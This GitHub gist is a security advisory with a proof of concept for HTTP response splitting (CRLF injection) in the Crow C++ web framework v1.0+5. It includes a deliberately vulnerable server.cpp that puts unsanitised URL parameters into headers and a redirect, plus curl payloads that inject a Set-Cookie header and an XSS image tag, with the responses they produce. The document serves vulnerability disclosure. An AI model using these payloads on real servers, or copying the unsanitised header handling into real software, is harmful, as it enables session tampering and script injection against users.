
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dellalibera](https://avatars.githubusercontent.com/u/43420907?s=64&v=4)](/dellalibera)

# [dellalibera](/dellalibera)/**[01\_HTTP\_Response\_Splitting\_Crow@v1.0+5.md](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c)** Secret

Created
May 16, 2023 09:29

Show Gist options

* [Download ZIP](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c/archive/67c606c1eaa3191605b45a492e2d711341817efe.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/9247769cc90ed96c0d72ddbcba88c65c.js&quot;&gt;&lt;/script&gt;
* Save dellalibera/9247769cc90ed96c0d72ddbcba88c65c to your computer and use it in GitHub Desktop.

[Code](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c)
[Revisions
1](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/9247769cc90ed96c0d72ddbcba88c65c.js&quot;&gt;&lt;/script&gt;

Save dellalibera/9247769cc90ed96c0d72ddbcba88c65c to your computer and use it in GitHub Desktop.

[Download ZIP](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c/archive/67c606c1eaa3191605b45a492e2d711341817efe.zip)

HTTP Response Splitting in Crow@v1.0+5

 [Raw](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c/raw/67c606c1eaa3191605b45a492e2d711341817efe/01_HTTP_Response_Splitting_Crow%40v1.0%2B5.md)

[**01\_HTTP\_Response\_Splitting\_Crow@v1.0+5.md**](#file-01_http_response_splitting_crow-v1-0-5-md)

# Information

**Project:** `CrowCpp/Crow`

**Tested Version:** `v1.0+5` (commit `dfc57edc237445a2459858d63b43195d41152522`)

**Github Repository:** [`https://github.com/CrowCpp/Crow`](https://github.com/CrowCpp/Crow)

## Details

`CrowCpp/Crow` is vulnerable to **HTTP Response Splitting** when untrusted user input is used to build headers values. Headers values are not properly sanitized against CRLF Injection in `set_header` (<https://github.com/CrowCpp/Crow/blob/dfc57edc237445a2459858d63b43195d41152522/include/crow/http_response.h#L51>) and `add_header`(<https://github.com/CrowCpp/Crow/blob/dfc57edc237445a2459858d63b43195d41152522/include/crow/http_response.h#L58>) functions. An attacker can add the `\r\n` (carriage return line feeds) characters to end the HTTP response headers and inject malicious content, like for example additional headers or new response body, leading to a potential XSS vulnerability.

More reference about this vulnerability and its impact:

* <https://owasp.org/www-community/attacks/HTTP_Response_Splitting>
* <https://cwe.mitre.org/data/definitions/113.html>

Reference to similar issues affecting other projects:

* <https://security.snyk.io/vuln/SNYK-SWIFT-APPLESWIFTNIO-3105796>

## Setup

Install the dependencies and the project:

```
sudo apt install libboost-dev
wget https://github.com/CrowCpp/Crow/releases/download/v1.0%2B5/crow-v1.0+5.deb
sudo apt install ./crow-v1.0+5.deb

```
## PoC

The PoC demonstrates how it's possible to add arbitrary headers and response body if user controlled values are used to set the headers value or the redirect.

* build and run the `server` file:

```
g++ server.cpp -o server -lpthread
./server

```

* run the following `curl` command to observe the response (or directly open the link in the browser to see the xss alert)

```
curl -i -X GET "http://localhost:8000/test2?q=test%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1%0d%0aContent-Length:40%0d%0aContent-Type:text/html%0d%0a%0a%3Cimg+src%3dx+onerror%3dalert(%22hello%22)+/%3E%0d%0a"
HTTP/1.1 200 OK
x-custom-header: test
Foo: Bar
Set-Cookie:admin=1
Content-Length:40
Content-Type:text/html

<img src=x onerror=alert("hello") />

```

* run the following `curl` command to objserve additional headers added:

```
curl -i -X GET "http://localhost:8000/test1?redirect=/test3%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1"
HTTP/1.1 307 Temporary Redirect
location: http://localhost:8000/test3
Foo: Bar
Set-Cookie:admin=1
Content-Length: 0
Server: Crow/1.0
Date: Tue, 16 May 2023 08:00:03 GMT
Connection: Keep-Alive

```
## Impact

If untrusted user input is placed in header values, a malicious user could inject additional headers or new response body, leading to a potential XSS vulnerability or a number of other issues.

## Author

Alessio Della Libera

 [Raw](/dellalibera/9247769cc90ed96c0d72ddbcba88c65c/raw/67c606c1eaa3191605b45a492e2d711341817efe/server.cpp)

[**server.cpp**](#file-server-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include "crow.h" |
| --- | --- |
|  |  |
|  | int main() |
|  | { |
|  | crow::SimpleApp app; |
|  |  |
|  | // curl -i -X GET "http://localhost:8000/test1?redirect=/test3%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1" |
|  | CROW\_ROUTE(app, "/test1") |
|  | ([](const crow::request& req) { |
|  |  |
|  | auto r = req.url\_params.get("redirect"); |
|  |  |
|  | crow::response res; |
|  | res.redirect(r); |
|  | return res; |
|  | }); |
|  |  |
|  | // curl -i -X GET "http://localhost:8000/test2?q=test%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1%0d%0aContent-Length:40%0d%0aContent-Type:text/html%0d%0a%0a%3Cimg+src%3dx+onerror%3dalert(%22hello%22)+/%3E%0d%0a" |
|  | CROW\_ROUTE(app, "/test2") |
|  | ([](const crow::request& req, crow::response& res) { |
|  |  |
|  | res.add\_header("x-custom-header", req.url\_params.get("q")); |
|  | res.write("test2"); |
|  | res.end(); |
|  | }); |
|  |  |
|  | CROW\_ROUTE(app, "/test3") |
|  | ([](const crow::request& req, crow::response& res) { |
|  | res.write("test3"); |
|  | res.end(); |
|  | }); |
|  |  |
|  |  |
|  | app.port(8000).run(); |
|  | } |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F9247769cc90ed96c0d72ddbcba88c65c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

